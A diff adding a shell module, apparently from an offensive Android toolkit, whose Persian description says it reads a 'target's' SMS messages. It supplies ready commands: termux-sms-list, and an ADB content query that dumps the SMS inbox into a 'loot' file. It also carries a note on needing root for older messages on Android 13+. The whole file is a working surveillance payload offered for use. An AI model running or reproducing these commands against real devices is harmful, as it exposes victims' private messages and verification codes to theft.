@@ -1,0 +1,17 @@
+DESC="خواندن پیامک‌های هدف"
+REQ="ADB"
+RISK="MED"
+NOTE="برای پیامک‌های قدیمی باید دیتابیس را بکشی؛ روی اندروید ۱۳+ دسترسی root لازم است"
+
+termux(){
+cat <<'EOF'
+termux-sms-list -l 50 | jq -r '.[] | "\(.number): \(.body)"'
+EOF
+}
+
+kali(){
+cat <<'EOF'
+adb shell content query --uri content://sms/inbox --projection address:body:date > loot/sms.txt
+sed -E 's/.*address=([^,]*), body=(.*), date.*/\1: \2/' loot/sms.txt | tail -40
+EOF
+}
